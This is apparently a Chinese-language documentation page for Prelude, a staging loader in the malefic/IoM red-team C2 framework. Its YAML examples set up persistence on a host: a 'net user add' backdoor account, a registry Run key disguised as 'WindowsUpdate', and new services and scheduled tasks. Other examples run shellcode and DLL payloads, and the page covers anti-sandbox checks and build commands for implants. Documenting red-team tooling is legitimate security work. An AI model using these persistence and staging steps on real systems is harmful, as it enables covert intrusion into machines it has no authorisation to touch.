---
title: Prelude
description: Prelude 是 IoM 的多段上线中间阶段加载器，用于在主 beacon 启动前执行预编排的任务序列。
edition: community
generated: false
source: imp:getting-started/components/prelude.md
---

# Prelude

Prelude 是 IoM 的多段上线中间阶段加载器，用于在主 beacon 启动前执行预编排的任务序列。

## 概述

Prelude 作为可选的中间阶段，允许在上线前自动执行一系列操作，如权限维持、反沙箱检测、反调试等。其核心特性：

- **编译时预编排** ：任务序列在编译时通过 YAML 定义并序列化到二进制中
- **自动执行** ：按顺序自动执行配置的任务，无需手动干预
- **灵活配置** ：支持执行 BOF、EXE、DLL、shellcode 等多种载荷
- **无需分阶段** ：可通过 stageless beacon 的 autorun 功能实现同样效果

## 工作原理

Prelude 的执行流程：

1. **加载配置** ：从编译时嵌入的 protobuf 数据中读取任务序列
2. **顺序执行** ：按照 YAML 中定义的顺序依次执行任务
3. **错误处理** ：任务失败时根据配置决定是否继续
4. **启动 Beacon** ：所有任务完成后启动主 beacon（可选）

## 使用场景

Prelude 适用于以下场景：

1. **权限维持** ：添加服务、计划任务、注册表项等
2. **反沙箱** ：检测虚拟机、沙箱环境，不符合条件则退出
3. **反调试** ：检测调试器、分析工具
4. **环境准备** ：创建目录、释放文件、修改配置
5. **前置操作** ：在主 beacon 启动前执行的任何操作

## Autorun 配置格式

Prelude 使用 YAML 格式定义任务序列，每个任务包含名称和执行体。

### 基本结构

```yaml
- name: task_name          # 任务名称（用于日志）
  body: !TaskType          # 任务类型
    # 任务参数
```

### 支持的任务类型

#### ExecuteBinary - 执行 BOF

执行 Beacon Object File（Cobalt Strike BOF）：

```yaml
- name: bof
  body: !ExecuteBinary
    name: addservice       # BOF 名称
    bin: !File "addservice.o"  # BOF 文件路径
```

#### ExecRequest - 执行命令

执行系统命令：

```yaml
- name: exe
  body: !ExecRequest
    args:
      - net
      - user
      - add
      - testuser
      - Password123!
```

#### ExecuteShellcode - 执行 Shellcode

执行原始 shellcode：

```yaml
- name: shellcode
  body: !ExecuteShellcode
    bin: !File "payload.bin"
    method: "CreateThread"  # 执行方法
```

#### ExecuteAssembly - 执行 .NET 程序集

执行 .NET Assembly：

```yaml
- name: assembly
  body: !ExecuteAssembly
    bin: !File "Seatbelt.exe"
    args:
      - "-group=system"
```

#### ExecuteDll - 执行 DLL

执行 DLL 文件：

```yaml
- name: dll
  body: !ExecuteDll
    bin: !File "payload.dll"
    export: "DllMain"       # 导出函数名
```

### 完整示例

```yaml
# persistence.yaml - 权限维持示例
- name: check_admin
  body: !ExecRequest
    args:
      - whoami
      - /priv

- name: add_service
  body: !ExecuteBinary
    name: addservice
    bin: !File "addservice.o"

- name: add_registry
  body: !ExecRequest
    args:
      - reg
      - add
      - "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      - /v
      - "WindowsUpdate"
      - /t
      - REG_SZ
      - /d
      - "C:\\Windows\\System32\\svchost.exe"
      - /f

- name: create_scheduled_task
  body: !ExecuteBinary
    name: taskschd
    bin: !File "taskschd.o"
```

## 编译流程

### 准备 Autorun 配置

创建 YAML 配置文件（如 `autorun.yaml`）：

```yaml
- name: persistence
  body: !ExecuteBinary
    name: addservice
    bin: !File "resources/addservice.o"
```

### 生成配置

使用 `malefic-mutant` 生成 prelude 配置：

```bash
malefic-mutant generate prelude autorun.yaml
```

此命令会：

- 解析 YAML 配置
- 序列化为 protobuf 格式
- 生成 `spite.bin` 文件
- 嵌入到 prelude 二进制中

可选参数：

```bash
# 指定自定义 resources 目录
malefic-mutant generate prelude autorun.yaml --resources ./my_resources
```

### 编译 Prelude

```bash
cargo build --release -p malefic-prelude --target x86_64-pc-windows-gnu
```

编译产物位于 `target/<target_triple>/release/malefic-prelude.exe`。

### 使用 Docker 编译

```bash
docker run -v "$(pwd):/root/src" --rm -it ghcr.io/chainreactors/malefic-builder:latest sh -c "malefic-mutant generate prelude autorun.yaml && cargo build -p malefic-prelude --target x86_64-pc-windows-gnu"
```

### 使用 GitHub Action 编译

```bash
gh workflow run generate.yaml \
  -f package="prelude" \
  -f autorun_yaml=$(base64 -w 0 <autorun.yaml) \
  -f malefic_config_yaml=$(base64 -w 0 <implant.yaml) \
  -f remark="prelude with persistence" \
  -f targets="x86_64-pc-windows-gnu" \
  -R <username/malefic>
```

## Beacon 集成 - Stageless Autorun

从 v0.1.0 开始，beacon 也支持 autorun 功能，无需分阶段上线即可实现 prelude 的功能。

### 配置方式

在 `implant.yaml` 中配置：

```yaml
implants:
  prelude: "persistence.yaml"  # 指向 autorun 配置文件
```

或使用新的字段名：

```yaml
implants:
  autorun: "persistence.yaml"
```

### 工作流程

1. 编译时将 autorun 配置序列化到 beacon 中
2. Beacon 启动时自动执行预编排任务
3. 任务完成后正常上线

### 使用示例

```bash
# 1. 准备 autorun 配置
cat > persistence.yaml <<EOF
- name: bof
  body: !ExecuteBinary
    name: addservice
    bin: !File "addservice.o"
EOF

# 2. 配置 implant.yaml
# implants:
#   autorun: "persistence.yaml"

# 3. 生成并编译 beacon
malefic-mutant generate beacon
cargo build --release -p malefic --target x86_64-pc-windows-gnu
```

## Feature Flags

Prelude 支持以下 feature：

### external_spite

启用外部 spite 文件支持：

```toml
[features]
external_spite = ["malefic-autorun/external_spite"]
```

启用后，prelude 可以从外部文件加载 spite 配置，而不是编译时嵌入。

## 文件引用

在 YAML 中引用文件时，支持以下方式：

### 相对路径

```yaml
bin: !File "addservice.o"           # 相对于当前目录
bin: !File "resources/payload.bin"  # 相对于 resources 目录
```

### 绝对路径

```yaml
bin: !File "/path/to/payload.bin"
bin: !File "C:\\payloads\\beacon.exe"
```

### 默认 Resources 目录

`malefic-mutant generate prelude` 默认从 `./resources/` 目录查找文件。可通过 `--resources` 参数修改：

```bash
malefic-mutant generate prelude autorun.yaml --resources /custom/path
```

## 最佳实践

### 任务顺序

按照依赖关系排列任务：

```yaml
- name: check_environment    # 先检查环境
  body: !ExecRequest
    args: ["whoami"]

- name: create_directory     # 再创建目录
  body: !ExecRequest
    args: ["mkdir", "C:\\temp"]

- name: drop_payload         # 最后释放文件
  body: !ExecuteDll
    bin: !File "payload.dll"
```

### 错误处理

关键任务失败时应停止执行：

```yaml
- name: critical_check
  body: !ExecRequest
    args: ["check_admin.exe"]
  # 失败则退出，不继续执行后续任务
```

### 资源管理

将所有依赖文件放在 `resources/` 目录：

```
resources/
├── addservice.o
├── taskschd.o
├── payload.dll
└── config.bin
```

### 测试验证

编译前验证 YAML 语法：

```bash
# 使用 yq 或其他 YAML 验证工具
yq eval autorun.yaml
```

## 与其他组件的关系

### Prelude vs Beacon Autorun

| 特性 | Prelude | Beacon Autorun |
|------|---------|----------------|
| 独立二进制 | ✅ 是 | ❌ 否（集成在 beacon 中） |
| 体积 | 较小 | 较大 |
| 灵活性 | 高（可单独投递） | 中（需重新编译 beacon） |
| 使用场景 | 分阶段上线 | Stageless 上线 |

### Prelude + Pulse

典型的三阶段上线：

1. **Pulse** ：最小 stager（4KB），拉取 prelude
2. **Prelude** ：执行前置任务，拉取 beacon
3. **Beacon** ：完整功能的 implant

## 故障排查

### 任务执行失败

检查日志输出，确认：

- 文件路径是否正确
- 文件是否存在于 resources 目录
- 权限是否足够

### 编译错误

确保：

- YAML 语法正确
- 引用的文件存在
- `malefic-mutant generate prelude` 成功执行

### 运行时错误

检查：

- 目标环境是否满足要求
- 依赖的 DLL/库是否存在
- 是否有足够的权限执行任务

## 相关文档

- [Prelude 构建](/malefic/build/prelude/) - prelude generate/build 与 autorun 配置
- [Mutant 工具](/malefic/getting-started/components/mutant/) - generate/build 与 implant.yaml
- [Modules 文档](/malefic/develop/modules/) - 可用的模块列表
- [Autorun 配置](/malefic/build/prelude/#嵌入-beacon-的-stageless-autorun) - Beacon 中的 autorun 集成
